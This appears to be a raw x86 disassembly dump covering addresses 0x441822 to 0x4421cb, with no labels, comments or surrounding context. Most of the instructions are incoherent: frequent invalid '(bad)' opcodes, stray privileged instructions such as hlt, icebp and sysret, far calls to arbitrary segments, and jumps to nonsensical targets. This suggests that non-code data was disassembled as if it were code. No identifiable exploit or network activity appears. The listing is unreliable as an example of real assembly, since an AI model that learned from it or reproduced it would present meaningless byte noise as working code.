  441822:	push   esp
  441823:	fstp   TBYTE PTR [eax+eax*1]
	...
  44183e:	hlt    
  44183f:	js     0x44181c
  441841:	cmp    al,0xf4
  441843:	rcr    ah,0x3c
  441846:	hlt    
  441847:	loop   0x441823
  441849:	cmp    al,0xf4
  44184b:	stc    
  44184c:	fidivr DWORD PTR [esp+esi*8]
  44184f:	pop    eax
  441850:	sar    DWORD PTR [esp+esi*8],1
  441853:	and    ah,dl
  441855:	cmp    al,0xf4
  441857:	pop    ss
  441858:	int    0x3c
  44185a:	hlt    
  44185b:	or     ebp,0xcd78f43c
  441861:	cmp    al,0xf4
  441863:	push   ecx
  441864:	ror    esp,0x38
  441867:	pop    ecx
  441868:	ror    esp,0x30
  44186b:	call   0x230704fa
  441870:	or     cl,BYTE PTR [eax]
  441872:	jns    0x4418db
  441874:	or     DWORD PTR [ebx],edi
  441876:	jg     0x441857
  441878:	test   DWORD PTR [edx-0x7b3216cc],0xc77ac1aa
  441882:	push   0x20408caf
  441887:	and    DWORD PTR [ebp-0x7514118c],edi
  44188d:	inc    edx
  44188e:	or     al,0xec
  441890:	xchg   esi,eax
  441891:	iret   
  441892:	ja     0x44186c
  441894:	add    al,0x85
  441896:	cmp    cl,BYTE PTR [eax+0x230c528c]
  44189c:	aas    
  44189d:	and    al,0x25
  44189f:	dec    edx
  4418a0:	cwde   
  4418a1:	rol    BYTE PTR [eax],1
	...
  4418bb:	ja     0x441895
  4418bd:	add    al,0xc1
  4418bf:	xor    ch,BYTE PTR [eax-0x640b0003]
  4418c5:	aam    0xbf
  4418c7:	cmp    bh,BYTE PTR [ecx-0x3d]
  4418ca:	add    al,0xf4
  4418cc:	add    al,0x5f
  4418ce:	cdq    
  4418cf:	lea    eax,[esi-0x3ce0c6e6]
  4418d5:	jmp    0x4418da
  4418d7:	test   al,0xb9
  4418d9:	sbb    eax,edi
  4418db:	inc    eax
  4418dc:	mov    ecx,0xb938c733
  4418e1:	sub    eax,edi
  4418e3:	xor    BYTE PTR [ecx+0x7a488c9c],bh
  4418e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4418ea:	or     edi,DWORD PTR [ecx-0x3]
  4418ed:	imul   ecx,ebp,0xffffffc0
  4418f0:	icebp  
  4418f1:	ins    DWORD PTR es:[edi],dx
  4418f2:	xor    esp,esp
  4418f4:	jns    0x44191d
  4418f6:	clc    
  4418f7:	test   eax,0xc2083479
  4418fc:	xor    al,0xc2
  4418fe:	mov    ch,0xa9
  441900:	shr    bl,0x38
  441903:	popa   
  441904:	jp     0x44192a
  441906:	hlt    
  441907:	jo     0x441939
  441909:	(bad)  [ecx+edi*2]
  44190c:	cmp    eax,0x35713203
  441911:	(bad)  
  441912:	xor    al,0xfd
  441914:	mov    dl,0x66
  441916:	shr    al,0x27
  441919:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44191a:	enter  0xb8c0,0xb3
  44191e:	enter  0x0,0x0
	...
  441936:	add    BYTE PTR [eax],al
  441938:	mov    eax,0xb0c8abb8
  44193d:	mov    eax,0x79c88b1c
  441942:	sbb    al,0xc
  441944:	jns    0x441989
  441946:	test   DWORD PTR [eax-0x7501ef4c],0x4d5ded27
  441950:	fdiv   DWORD PTR [edx]
  441952:	pop    esi
  441953:	xor    DWORD PTR [eax],ecx
  441955:	xor    ebp,DWORD PTR [esi+0x31]
  441958:	add    al,0x33
  44195a:	outs   dx,BYTE PTR ds:[esi]
  44195b:	xor    eax,esi
  44195d:	xor    al,BYTE PTR [eax]
  44195f:	cwde   
  441960:	xor    BYTE PTR [ebp+edi*2-0x42d57bdb],0x72
  441968:	xor    eax,0x9f3b2cf5
  44196d:	inc    ebp
  44196e:	jae    0x44195c
  441970:	sahf   
  441971:	xor    dl,BYTE PTR [edx*4+0x6c807f4]
  441978:	sub    eax,0x5f948548
  44197d:	aaa    
  44197e:	test   DWORD PTR [eax-0x5b7aca9d],ebx
  441984:	sti    
  441985:	xor    al,0x85
  441987:	sub    BYTE PTR [eax+0x37],bl
  44198a:	stc    
  44198b:	mov    ecx,0x3410c076
  441990:	aaa    
  441991:	mov    eax,0xb83b9dcc
  441996:	int3   
  441997:	mov    ch,0x33
  441999:	mov    eax,0xadcc
	...
  4419b2:	add    BYTE PTR [eax],al
  4419b4:	add    BYTE PTR [ebx],bh
  4419b6:	mov    eax,0x986f1ccc
  4419bb:	test   DWORD PTR [eax+eax*1],esp
  4419be:	or     BYTE PTR [eax-0x7],bh
  4419c1:	idiv   DWORD PTR [edi+0x4b]
  4419c4:	in     eax,dx
  4419c5:	outs   dx,BYTE PTR ds:[esi]
  4419c6:	xor    al,0x1c
  4419c8:	cmp    dh,al
  4419ca:	adc    BYTE PTR [esi],al
  4419cc:	bound  esi,QWORD PTR [edi]
  4419ce:	adc    ecx,edi
  4419d0:	cdq    
  4419d1:	jbe    0x441a1c
  4419d3:	or     BYTE PTR [edi+esi*4],bl
  4419d6:	mov    al,BYTE PTR [eax-0x33]
  4419d9:	adc    BYTE PTR [ebp+0x7d],0xa5
  4419dd:	inc    DWORD PTR [ecx]
  4419df:	clc    
  4419e0:	data16 in al,0x5
  4419e3:	add    eax,0xf94b7629
  4419e8:	mov    ah,0xb6
  4419ea:	xor    cl,dh
  4419ec:	lods   al,BYTE PTR ds:[esi]
  4419ed:	mov    dh,0x51
  4419ef:	int3   
  4419f0:	add    cl,ah
  4419f2:	dec    ebx
  4419f3:	int3   
  4419f4:	int3   
  4419f5:	ror    DWORD PTR [ebx-0x34],1
  4419f8:	int3   
  4419f9:	jnp    0x44198a
  4419fb:	jmp    0xb874:0xee84edf7
  441a02:	lea    esp,[esp+0x88d]
  441a09:	fisttp DWORD PTR [eax-0x5]
  441a0c:	jae    0x441a72
  441a0e:	or     ebp,DWORD PTR [esi+0x79b8ae11]
  441a14:	loop   0x441a78
  441a16:	pop    es
	...
  441a2f:	add    BYTE PTR [eax],al
  441a31:	add    BYTE PTR [eax+esi*4],cl
  441a34:	or     BYTE PTR [ebx],dh
  441a36:	pop    ecx
  441a37:	cmc    
  441a38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441a39:	and    bl,BYTE PTR ds:0xa84e3909
  441a3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441a40:	dec    ebx
  441a41:	push   edi
  441a42:	into   
  441a43:	call   0xfffa:0xd9f0f20
  441a4a:	sbb    eax,0x32c1f68d
  441a4f:	test   BYTE PTR [edi+edi*8-0x2f7cf8e2],al
  441a56:	pop    esp
  441a57:	scas   eax,DWORD PTR es:[edi]
  441a58:	adc    BYTE PTR [ebx+0x8e34835],cl
  441a5e:	mov    WORD PTR [ebp+0x80d00f7],fs
  441a64:	jns    0x441a48
  441a66:	or     BYTE PTR [eax],0x0
  441a69:	add    BYTE PTR [esi+0x75],ah
  441a6c:	mov    gs,WORD PTR [eax+0x32ffc7bb]
  441a72:	mov    ecx,0x1d2aa7fa
  441a77:	or     DWORD PTR [ebx+0x18ae1cd8],eax
  441a7d:	xor    ecx,ecx
  441a7f:	cli    
  441a80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441a81:	and    dh,ah
  441a83:	lods   eax,DWORD PTR ds:[esi]
  441a84:	std    
  441a85:	and    dh,BYTE PTR [ebx-0x18000293]
  441a8b:	popa   
  441a8c:	jp     0x441a36
  441a8e:	shr    BYTE PTR [ebp+0x72452cfd],cl
  441a94:	mov    BYTE PTR [esi+0x0],bh
	...
  441aae:	add    BYTE PTR [ebp-0x74dd0c3b],dh
  441ab4:	ins    DWORD PTR es:[edi],dx
  441ab5:	std    
  441ab6:	jmp    FWORD PTR [edi+0x69]
  441ab9:	jp     0x441a63
  441abb:	shr    BYTE PTR [ebp+0x2c4e84fd],cl
  441ac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441ac2:	or     BYTE PTR [ebp+0xe],dh
  441ac5:	xchg   ebx,eax
  441ac6:	add    ah,dh
  441ac8:	ins    DWORD PTR es:[edi],dx
  441ac9:	rol    BYTE PTR [ebx],1
  441acb:	jns    0x441a92
  441acd:	in     eax,0x3f
  441acf:	hlt    
  441ad0:	out    0xb5,al
  441ad2:	mov    edi,0x3cf055f
  441ad7:	popa   
  441ad8:	xchg   ebp,eax
  441ad9:	fistp  QWORD PTR [edi]
  441adb:	hlt    
  441adc:	in     al,dx
  441add:	sahf   
  441ade:	stc    
  441adf:	hlt    
  441ae0:	ins    DWORD PTR es:[edi],dx
  441ae1:	std    
  441ae2:	sub    al,0xf0
  441ae4:	loopne 0x441b4a
  441ae6:	sub    dh,BYTE PTR [ebp+ebp*2-0x1913c130]
  441aed:	lods   al,BYTE PTR ds:[esi]
  441aee:	mov    edi,0xd8885d1e
  441af3:	xor    eax,0x177f0596
  441af8:	mov    ds:0xecf4fffd,al
  441afd:	sahf   
  441afe:	stc    
  441aff:	hlt    
  441b00:	imul   edi,ebp,0xffffff84
  441b03:	add    cl,ah
  441b05:	and    dh,BYTE PTR fs:[esp+ebp*2]
  441b09:	rcl    BYTE PTR [ebx],1
  441b0b:	jns    0x441ad1
  441b0d:	out    0x3f,al
  441b0f:	hlt    
  441b10:	out    0xb4,al
  441b12:	mov    edi,0x0
	...
  441b2b:	add    bh,bl
  441b2d:	add    eax,0x9fe7d0ff
  441b32:	(bad)  
  441b33:	loope  0x441b30
  441b35:	add    al,0xc
  441b37:	xchg   ebp,eax
  441b38:	hlt    
  441b39:	add    al,0xe7
  441b3b:	rol    BYTE PTR [edi],1
  441b3d:	mov    BYTE PTR [edi-0x9fb1c1b],cl
  441b43:	xor    ch,al
  441b45:	lea    esp,ds:0x4159cc2
  441b4b:	xchg   ebp,eax
  441b4c:	hlt    
  441b4d:	add    al,0xe7
  441b4f:	mov    al,bh
  441b51:	xchg   DWORD PTR [edi-0x23],ecx
  441b54:	mov    ebx,0xb3b95e04
  441b59:	outs   dx,BYTE PTR ds:[esi]
  441b5a:	fild   WORD PTR [edx+0x3e78249]
  441b60:	hlt    
  441b61:	xor    eax,0x2f8c76e3
  441b66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441b67:	add    edi,DWORD PTR [ecx+0x5f]
  441b6a:	sub    BYTE PTR [eax+0x70eb35ec],ch
  441b70:	mov    WORD PTR [edi],fs
  441b72:	daa    
  441b73:	add    al,0xbb
  441b75:	data16 rol BYTE PTR [esp+esi*8],cl
  441b79:	add    al,0x16
  441b7b:	or     BYTE PTR [edi-0xbbbee53],al
  441b81:	xor    eax,0x5570f428
  441b86:	test   al,0x9e
  441b88:	in     al,0x8d
  441b8a:	pop    ebp
  441b8c:	adc    DWORD PTR ds:0xa668,ecx
	...
  441ba6:	add    BYTE PTR [eax],al
  441ba8:	add    ch,bh
  441baa:	add    al,0xe7
  441bac:	add    esi,DWORD PTR [ecx+0x19]
  441baf:	jl     0x441c0d
  441bb1:	push   ss
  441bb2:	(bad)
  441bb5:	leave  
  441bb6:	and    edi,0xd335f403
  441bbc:	jo     0x441b4a
  441bbe:	add    BYTE PTR cs:[ecx],ch
  441bc1:	clc    
  441bc2:	xchg   eax,ebx
  441bc4:	test   al,0x6b
  441bc6:	sbb    al,0x2d
  441bc8:	std    
  441bc9:	inc    esp
  441bca:	lods   eax,DWORD PTR ds:[esi]
  441bcb:	push   ds
  441bcc:	test   eax,0xe9f925f7
  441bd1:	test   DWORD PTR [ebp*1+0x2aac7cf5],0x4f2ff7a9
  441bdc:	aad    0x1a
  441bde:	ret    
  441bdf:	mov    edi,0xf9268841
  441be4:	jmp    0xedc920e0
  441be9:	ins    BYTE PTR es:[edi],dx
  441bea:	lods   al,BYTE PTR ds:[esi]
  441beb:	and    ch,BYTE PTR [ecx+0x28d687f7]
  441bf1:	xchg   ebx,eax
  441bf2:	or     al,0x7f
  441bf4:	or     al,BYTE PTR [edi+0x4ae90004]
  441bfa:	add    eax,0x413a519b
  441bff:	add    BYTE PTR [edx-0x5e],ah
  441c02:	shl    ebp,0xd1
  441c05:	and    al,BYTE PTR ds:0x4159919b
  441c0b:	add    BYTE PTR [eax+0x0],ch
	...
  441c26:	xchg   ecx,eax
  441c27:	jnp    0x441c29
  441c29:	jmp    0x74484c25
  441c2e:	iret   
  441c2f:	cs inc eax
  441c31:	jmp    0xfa64ddb0
  441c36:	mov    al,0x7c
  441c38:	jge    0x441c01
  441c3a:	pop    ss
  441c3b:	mov    al,dl
  441c3d:	bound  ebx,QWORD PTR [edi-0x3f]
  441c40:	out    0xf9,al
  441c42:	cmp    BYTE PTR [edi+0x8],ah
  441c45:	push   0xe9007b51
  441c4a:	test   DWORD PTR [ecx+0x234f7414],0x89cd0040
  441c54:	(bad)  
  441c56:	int    0x4
  441c58:	add    BYTE PTR [ebx],dh
  441c5a:	mov    cl,0xf5
  441c5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441c5d:	sub    bl,BYTE PTR ds:0xcd88309
  441c63:	lahf   
  441c64:	sbb    BYTE PTR [ebx],dh
  441c66:	shl    ebp,0xa7
  441c69:	and    bl,BYTE PTR [ebp+0x4]
  441c6c:	sbb    eax,0x49dff
  441c71:	xor    eax,ecx
  441c73:	lea    ebp,[eax+0x2b044d2e]
  441c79:	push   ecx
  441c7a:	leave  
  441c7b:	(bad)  
  441c7c:	mov    ecx,0x1e7435c1
  441c81:	dec    DWORD PTR [ebp-0x6e74fffc]
  441c87:	lea    ebp,[eax+0x26]
	...
  441ca1:	add    BYTE PTR [eax],al
  441ca3:	popf   
  441ca4:	add    al,0x83
  441ca6:	ficomp DWORD PTR [edi+ebx*4]
  441ca9:	or     BYTE PTR [ecx+0x92ee],al
  441caf:	dec    ebp
  441cb0:	push   edi
  441cb1:	std    
  441cb2:	pushf  
  441cb3:	mov    ch,0x61
  441cb5:	cmp    DWORD PTR [eax],eax
  441cb7:	(bad)  
  441cb8:	mov    cl,0xb9
  441cba:	jmp    0x441cb1
  441cbc:	pop    ecx
  441cbd:	std    
  441cbe:	pushf  
  441cbf:	cmp    DWORD PTR gs:[bx+si],eax
  441cc3:	pushf  
  441cc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441cc5:	test   DWORD PTR [eax],0x42b041d
  441ccb:	shl    al,0x25
  441cce:	inc    eax
  441ccf:	or     eax,0x498506c5
  441cd4:	nop
  441cd5:	idiv   edi
  441cd7:	sahf   
  441cd8:	xchg   edx,eax
  441cd9:	add    al,0x72
  441cdb:	mov    ebp,0x67c1ce01
  441ce0:	pop    es
  441ce1:	cmp    edi,0xfffffff4
  441ce4:	pop    edx
  441ce5:	(bad)  
  441ce6:	jl     0x441c9d
  441ce8:	imul   edi,DWORD PTR [eax+edi*8-0x4b],0xd37ef496
  441cf0:	inc    BYTE PTR [ebx]
  441cf2:	add    ah,dh
  441cf4:	loop   0x441cc5
  441cf6:	mov    edx,0x3d479c
  441cfb:	outs   dx,DWORD PTR ds:[esi]
  441cfc:	lds    edi,FWORD PTR [ebp+eiz*8-0x65d1314]
  441d03:	hlt    
  441d04:	ins    DWORD PTR es:[edi],dx
  441d05:	std    
  441d06:	sub    al,0x0
	...
  441d20:	call   0x346a7915
  441d25:	outs   dx,BYTE PTR ds:[esi]
  441d26:	jl     0x441d00
  441d28:	mov    ch,0xd2
  441d2a:	jmp    0x441d58
  441d2c:	rcr    al,1
  441d2e:	pop    ebx
  441d2f:	push   ds
  441d30:	xor    al,0x6e
  441d32:	loop   0x441d2c
  441d34:	hlt    
  441d35:	ins    DWORD PTR es:[edi],dx
  441d36:	std    
  441d37:	sub    al,0xb8
  441d39:	call   0x6df84799
  441d3e:	test   dl,ch
  441d40:	lock mov ds:0x3ee9c17c,eax
  441d46:	das    
  441d47:	push   ebp
  441d48:	jno    0x441dc1
  441d4a:	adc    DWORD PTR [esi],edx
  441d4c:	fs push di
  441d4f:	sysret 
  441d51:	push   ds
  441d52:	jge    0x441d32
  441d54:	inc    ebx
  441d55:	ins    DWORD PTR es:[edi],dx
  441d56:	std    
  441d57:	push   DWORD PTR ds:0xf82cf555
  441d5d:	add    BYTE PTR [ebp+0x1e],dl
  441d60:	mov    ah,0x6d
  441d62:	ds dec edx
  441d64:	test   eax,0xbad0984e
  441d69:	stos   BYTE PTR es:[edi],al
  441d6a:	mov    ecx,0x7b2040cc
  441d6f:	in     al,dx
  441d70:	jg     0x441d92
  441d72:	add    BYTE PTR [ebx+0xa1c042d],al
  441d78:	leave  
  441d79:	inc    esp
  441d7a:	cmp    al,0xc6
  441d7c:	add    BYTE PTR ds:0x8a04365e,al
  441d82:	and    al,0xfc
	...
  441d9c:	add    bl,bl
  441d9e:	sub    BYTE PTR [eax+edx*4-0x5b1f23],al
  441da5:	ror    DWORD PTR [edx+0x64],cl
  441da8:	test   DWORD PTR [eax+0x5],esp
  441dab:	out    0x3,eax
  441dad:	mov    ebx,DWORD PTR [edi]
  441daf:	call   0x6c1b11b7
  441db4:	daa    
  441db5:	fadd   DWORD PTR [esi+edx*1]
  441db8:	call   0x9b4:0x85178c16
  441dbf:	mov    al,0x16
  441dc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  441dc2:	nop
  441dc3:	gs jnp 0x441dc1
  441dc6:	add    al,0xe7
  441dc8:	dec    edx
  441dc9:	out    dx,al
  441dca:	add    al,0xe7
  441dcc:	add    edx,ecx
  441dce:	jbe    0x441d59
  441dd0:	jp     0x441d96
  441dd2:	and    DWORD PTR [edi],0x1bf7bb07
  441dd8:	jle    0x441dc4
  441dda:	add    ch,bl
  441ddc:	add    esi,esp
  441dde:	mov    ebx,0x4f403d6
  441de3:	ins    BYTE PTR es:[edi],dx
  441de4:	daa    
  441de5:	sbb    BYTE PTR ds:0x8bd699b6,al
  441deb:	mov    bh,0x84
  441ded:	xor    al,0x9
  441def:	xor    BYTE PTR [ecx],bl
  441df1:	inc    edi
  441df2:	mov    ebp,0x4f403e8
  441df7:	dec    ecx
  441df8:	jge    0x441da4
  441dfa:	cwde   
  441dfb:	jecxz  0x441e00
  441dfd:	hlt    
  441dfe:	xor    DWORD PTR [edi+0x7d],esp
	...
  441e18:	add    BYTE PTR [eax],al
  441e1a:	call   0x8b:0xf403d1b0
  441e21:	imul   ebp,DWORD PTR [eax-0x7f16ffee],0xfffffffe
  441e28:	scas   eax,DWORD PTR es:[edi]
  441e29:	push   edi
  441e2b:	add    al,0x87
  441e2d:	imul   ebx,DWORD PTR [eax+0x13],0x0
  441e31:	jmp    0x9e10de4f
  441e36:	mov    ah,0x50
  441e38:	int3   
  441e39:	mov    ch,0xb4
  441e3b:	push   eax
  441e3c:	int3   
  441e3d:	lods   eax,DWORD PTR ds:[esi]
  441e3e:	mov    ah,0x50
  441e40:	int3   
  441e41:	sbb    al,0x4f
  441e43:	jno    0x441e94
  441e45:	bound  ecx,QWORD PTR [eax-0x2b]
  441e48:	adc    ebp,ecx
  441e4a:	test   edi,0xd0d7251
  441e50:	test   DWORD PTR [ebp+0x40],esi
  441e53:	loope  0x441e59
  441e55:	jmp    0xff50a851
  441e5a:	sbb    dl,bl
  441e5c:	sti    
  441e5d:	add    cl,BYTE PTR [esi+0xb]
  441e60:	mov    DWORD PTR [eax-0x53fffb10],ecx
  441e66:	pushf  
  441e67:	mov    BYTE PTR [ecx+esi*2-0x16fff830],dh
  441e6e:	out    dx,al
  441e6f:	mov    al,ds:0x7d6eb588
  441e74:	stc    
  441e75:	fmulp  st(2),st
  441e77:	sbb    BYTE PTR [ecx-0x66df3d0a],dh
  441e7d:	xchg   DWORD PTR [eax],eax
	...
  441e97:	ds push eax
  441e99:	outs   dx,BYTE PTR ds:[esi]
  441e9a:	shr    ah,1
  441e9c:	sbb    al,0x86
  441e9e:	push   ebp
  441e9f:	cli    
  441ea0:	fcom   QWORD PTR [ebx]
  441ea2:	jmp    0x71f8a69e
  441ea7:	jecxz  0x441eb0
  441ea9:	add    cl,ch
  441eab:	cmp    eax,0x1c310291
  441eb0:	jge    0x441eab
  441eb2:	add    dl,bl
  441eb4:	pop    es
  441eb5:	cmp    DWORD PTR [ebx+0xb5bf989],ecx
  441ebb:	sbb    eax,0x51558301
  441ec0:	jle    0x441e72
  441ec2:	adc    al,0x7a
  441ec4:	jle    0x441e76
  441ec6:	sbb    al,0x4a
  441ec8:	and    dh,BYTE PTR [ebx]
  441eca:	ror    DWORD PTR [edi],cl
  441ecc:	shr    DWORD PTR [ebx+edx*1+0x56],0x3d
  441ed1:	cld    
  441ed2:	mov    dl,BYTE PTR [ecx+0x6]
  441ed5:	pop    eax
  441ed6:	adc    al,0xdd
  441ed8:	or     BYTE PTR [edx],dh
  441eda:	pushf  
  441edb:	(bad)  [eax]
  441edd:	adc    al,0x0
  441edf:	int    0x12
  441ee1:	mov    edi,DWORD PTR es:[eax-0x80]
  441ee5:	xor    BYTE PTR [ebp+ebp*1-0x62fffcd4],0xff
  441eed:	(bad)  
  441eee:	push   eax
  441eef:	test   eax,0xdc8b0008
  441ef4:	push   es
  441ef5:	ror    DWORD PTR [ecx-0x35cb7fb8],0x0
	...
  441f14:	inc    ebx
  441f15:	xchg   BYTE PTR [ebx-0x74072eb3],al
  441f1b:	mov    al,0xb1
  441f1d:	jg     0x441f18
  441f1f:	push   DWORD PTR [ebx-0x5f1a7cd1]
  441f25:	inc    edi
  441f26:	adc    DWORD PTR [ebp-0xf],0xfffffffe
  441f2a:	inc    esp
  441f2b:	or     BYTE PTR [ebx+0x718893f9],dl
  441f31:	jg     0x441f2c
  441f33:	jmp    DWORD PTR [esi-0x1]
  441f36:	fcomp  QWORD PTR [ebp+0xe]
  441f39:	stc    
  441f3a:	fwait
  441f3b:	mov    al,0xb1
  441f3d:	jge    0x441f38
  441f3f:	push   ebx
  441f41:	sub    eax,0x30f4e583
  441f46:	mov    edi,0xc09a30cc
  441f4b:	int3   
  441f4c:	sub    BYTE PTR [edx-0x55bf3340],dh
  441f52:	ror    ah,0x38
  441f55:	sbb    DWORD PTR [edi-0x14],esi
  441f58:	ja     0x441f14
  441f5a:	fadd   QWORD PTR [ebp+eiz*4+0xd853069]
  441f61:	div    DWORD PTR [eax+ecx*1]
  441f64:	jge    0x441f9e
  441f66:	pushf  
  441f67:	test   DWORD PTR ds:0x6fdc30e5,eax
  441f6d:	sbb    al,0x8
  441f6f:	push   edx
  441f70:	jge    0x441f82
  441f72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441f73:	test   DWORD PTR ds:0x853466,esp
	...
  441f91:	cmp    eax,0x6dc6d05e
  441f96:	mov    eax,0x3c6b09a1
  441f9b:	ja     0x441f63
  441f9d:	mov    ch,0xcf
  441f9f:	repz add al,0xae
  441fa2:	in     al,0x7b
  441fa4:	cmp    al,0xef
  441fa6:	ins    DWORD PTR es:[edi],dx
  441fa7:	std    
  441fa8:	xchg   BYTE PTR [ebp+ebp*4-0x8],bh
  441fac:	dec    DWORD PTR [ebx-0x10bb841c]
  441fb2:	ins    DWORD PTR es:[edi],dx
  441fb3:	std    
  441fb4:	xchg   BYTE PTR [ebp+esi*4-0x8],ch
  441fb8:	push   DWORD PTR [ebx-0xc]
  441fbb:	jnp    0x442009
  441fbd:	jmp    FWORD PTR [ebp-0x3]
  441fc0:	xchg   BYTE PTR [ebp+edi*4-0x8],ch
  441fc4:	call   FWORD PTR [ebx-0xc]
  441fc7:	jnp    0x44201d
  441fc9:	jmp    FWORD PTR [ebp-0x3]
  441fcc:	xchg   BYTE PTR [ebp+edx*4-0x8],bh
  441fd0:	inc    DWORD PTR [ebx-0x1a]
  441fd3:	jnp    0x442029
  441fd5:	loopne 0x441fdb
  441fd7:	out    0x3,eax
  441fd9:	jns    0x441f6b
  441fdb:	outs   dx,DWORD PTR ds:[esi]
  441fdc:	das    
  441fdd:	icebp  
  441fde:	add    al,0xe7
  441fe0:	sar    BYTE PTR [edx],1
  441fe2:	loop   0x442043
  441fe4:	aas    
  441fe5:	imul   eax,DWORD PTR [esi],0x10a87b6e
  441feb:	out    0x3,eax
  441fed:	fnstenv [edx+0x28]
  441ff0:	jnp    0x441f91
  441ff2:	pop    esp
  441ff3:	pusha  
  441ff4:	push   cs
	...
  44200d:	add    al,bh
  44200f:	mov    WORD PTR [esp+ecx*4],ds
  442012:	jae    0x442090
  442014:	fadd   QWORD PTR [ecx]
  442016:	hlt    
  442017:	add    al,0xe2
  442019:	jle    0x442065
  44201b:	add    al,0xe7
  44201d:	add    ebp,DWORD PTR [edi-0x6f]
  442020:	outs   dx,DWORD PTR ds:[esi]
  442021:	das    
  442022:	stc    
  442023:	add    al,0xe7
  442025:	jp     0x44204e
  442027:	jno    0x442056
  442029:	into   
  44202a:	sar    DWORD PTR [edx-0x19],0xd8
  44202e:	stos   BYTE PTR es:[edi],al
  44202f:	push   es
  442030:	sub    eax,0x7069477a
  442035:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442037:	xchg   ebp,eax
  442038:	pop    esi
  442039:	ds test al,0x8e
  44203c:	clc    
  44203d:	cld    
  44203e:	fs leave 
  442040:	push   ebp
  442041:	add    ebp,edi
  442043:	mov    cl,0xab
  442045:	js     0x441fd1
  442047:	(bad)
  44204a:	inc    BYTE PTR [edx]
  44204c:	mov    eax,ds:0x9c8cad78
  442051:	mov    edx,esi
  442053:	mov    ebp,DWORD PTR [ebx-0x43c09590]
  442059:	ffree  st(1)
  44205c:	pop    ebp
  44205d:	push   cs
  44205e:	push   eax
  44205f:	jecxz  0x442062
  442061:	xchg   DWORD PTR [eax+edi*1+0x35f403ee],edi
  442068:	add    bh,bh
  44206a:	cmp    edx,DWORD PTR [ebp+0x7c]
  44206d:	jecxz  0x44202b
  44206f:	push   0x25
  442071:	fiadd  WORD PTR [eax]
	...
  44208b:	mov    bl,0xfd
  44208d:	fbstp  TBYTE PTR [edx+0x44]
  442090:	mov    ch,0x9
  442092:	sahf   
  442093:	sub    al,0x89
  442095:	std    
  442096:	sahf   
  442097:	pop    ds
  442098:	lods   eax,DWORD PTR ds:[esi]
  442099:	leave  
  44209a:	call   0xe956cd2e
  44209f:	idiv   DWORD PTR [edi+0x4b]
  4420a2:	xchg   ebp,eax
  4420a3:	jne    0x4420e7
  4420a5:	je     0x442080
  4420a7:	(bad)  
  4420a8:	mov    ah,0x54
  4420aa:	js     0x4420a6
  4420ac:	ja     0x442081
  4420ae:	out    dx,al
  4420af:	dec    esi
  4420b0:	push   esp
  4420b1:	(bad)  
  4420b2:	js     0x4420f0
  4420b4:	pop    ss
  4420b5:	add    cl,ch
  4420b7:	pop    edx
  4420b8:	(bad)  
  4420b9:	sti    
  4420ba:	jb     0x4420a1
  4420bc:	jl     0x44213b
  4420be:	and    al,0x64
  4420c0:	add    cl,bh
  4420c2:	and    al,0x5c
  4420c4:	cmc    
  4420c5:	mov    esp,DWORD PTR [esi+eiz*2+0xb]
  4420c9:	test   BYTE PTR ds:0x6c0004f8,ch
  4420cf:	cmp    al,0xfd
  4420d1:	cmp    esp,edx
  4420d3:	test   DWORD PTR [eax*4+0x61c1739c],0x3bcd3c6a
  4420de:	repnz test DWORD PTR [eax+eax*1],0x3bcd0464
  4420e6:	loop   0x4420df
  4420e8:	add    al,0x73
  4420ea:	clc    
  4420eb:	in     al,dx
  4420ec:	mov    al,ds:0xe924
	...
  442105:	add    BYTE PTR [eax],al
  442107:	add    bh,dh
  442109:	add    al,0x0
  44210b:	push   0xffffff82
  44210d:	jp     0x442157
  44210f:	xchg   DWORD PTR [edx+0x32],esi
  442112:	add    BYTE PTR [eax],al
  442114:	rcl    DWORD PTR [ebx+0x38d1835e],1
  44211a:	or     ecx,DWORD PTR ss:[ebp+0x5]
  44211e:	cli    
  44211f:	mov    ecx,0x8e4a
  442124:	ret    
  442125:	call   DWORD PTR [ebx-0x685f6b8]
  44212b:	call   DWORD PTR [esi+0x3a015eb7]
  442131:	and    dh,0x2
  442134:	mov    al,ds:0x86b77793
  442139:	xor    al,0xfc
  44213b:	test   DWORD PTR [edi+0x9],ebx
  44213e:	gs mov eax,ecx
  442141:	pushf  
  442142:	pop    es
  442143:	mov    bh,0xda
  442145:	stc    
  442146:	je     0x44213c
  442148:	push   eax
  442149:	mov    esi,DWORD PTR [esp+edx*2+0x56]
  44214d:	cmp    eax,0xfc418df0
  442152:	pop    ebx
  442153:	or     ebx,ebp
  442155:	add    al,0x85
  442157:	fld    QWORD PTR [eax+eax*1]
  44215b:	add    BYTE PTR [esi+0x3e],dl
  44215e:	cld    
  44215f:	(bad)  
  442160:	fcom   DWORD PTR [eax-0x65e1185]
  442166:	ins    BYTE PTR es:[edi],dx
  442167:	loopne 0x44213f
  442169:	cmp    eax,0x7fe8
	...
  442182:	add    BYTE PTR [eax],al
  442184:	add    dl,bh
  442186:	jnp    0x442138
  442188:	jl     0x4421a0
  44218a:	add    al,BYTE PTR [ebp+0x33020674]
  442190:	cli    
  442191:	inc    ecx
  442192:	imul   eax,DWORD PTR [edx+ebx*8-0x47c540a],0xfd82d16
  44219d:	shr    BYTE PTR [edi-0x7c],cl
  4421a0:	(bad)  
  4421a2:	mov    cl,bh
  4421a4:	mov    bh,0xf4
  4421a6:	(bad)
  4421a9:	pop    ebx
  4421aa:	cmp    BYTE PTR [edx+edx*1+0x53],0xb1
  4421af:	mov    DWORD PTR [ebp+0x737b71c9],eax
  4421b5:	push   esp
  4421b6:	jmp    0xe3bc9540
  4421bb:	pop    es
  4421bc:	in     al,dx
  4421bd:	ja     0x44220e
  4421bf:	add    al,BYTE PTR [esi+0x7d]
  4421c2:	fst    DWORD PTR [edi+0x262f8a73]
  4421c8:	push   ebp
  4421c9:	outs   dx,DWORD PTR ds:[esi]
  4421ca:	inc    ecx
  4421cb:	and    DWORD PTR [ebp-0x33474dc0],edi
